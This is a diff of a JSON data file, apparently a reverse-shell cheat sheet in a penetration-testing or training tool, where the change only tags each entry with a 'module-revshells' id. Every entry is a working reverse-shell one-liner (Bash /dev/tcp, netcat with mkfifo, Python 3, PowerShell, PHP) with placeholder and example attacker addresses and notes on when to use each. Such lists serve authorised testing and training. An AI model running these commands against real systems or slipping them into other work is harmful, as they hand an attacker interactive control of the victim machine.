@@ -12,7 +12,10 @@
     "command": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
     "description": "A classic reverse shell using Bash's built-in /dev/tcp device file.",
     "when_to_use": "When you have command execution on a Linux system and bash is available.",
-    "example": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
+    "example": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
+    "module_ids": [
+      "module-revshells"
+    ]
   },
   {
     "id": "revshell-nc-mkfifo",
@@ -27,7 +30,10 @@
     "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
     "description": "Reverse shell using standard Netcat and a named pipe (mkfifo). Useful when the target's nc version doesn't support the -e flag.",
     "when_to_use": "When 'nc -e' is not supported (OpenBSD netcat) but nc is installed.",
-    "example": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"
+    "example": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.10 4444 >/tmp/f",
+    "module_ids": [
+      "module-revshells"
+    ]
   },
   {
     "id": "revshell-python3",
@@ -42,7 +48,10 @@
     "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
     "description": "A one-liner Python 3 reverse shell using the socket and subprocess modules.",
     "when_to_use": "When python3 is installed on the target system.",
-    "example": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
+    "example": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
+    "module_ids": [
+      "module-revshells"
+    ]
   },
   {
     "id": "revshell-powershell",
@@ -57,7 +66,10 @@
     "command": "$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
     "description": "A standard PowerShell reverse shell.",
     "when_to_use": "When you have command execution on a Windows machine via PowerShell.",
-    "example": "$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    "example": "$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+    "module_ids": [
+      "module-revshells"
+    ]
   },
   {
     "id": "revshell-php",
@@ -72,6 +84,9 @@
     "command": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"bash -i <&3 >&3 2>&3\");'",
     "description": "A simple PHP reverse shell executing a shell via exec().",
     "when_to_use": "When you can execute PHP code on the target server.",
-    "example": "php -r '$sock=fsockopen(\"10.10.10.10\",4444);exec(\"bash -i <&3 >&3 2>&3\");'"
+    "example": "php -r '$sock=fsockopen(\"10.10.10.10\",4444);exec(\"bash -i <&3 >&3 2>&3\");'",
+    "module_ids": [
+      "module-revshells"
+    ]
   }
 ]
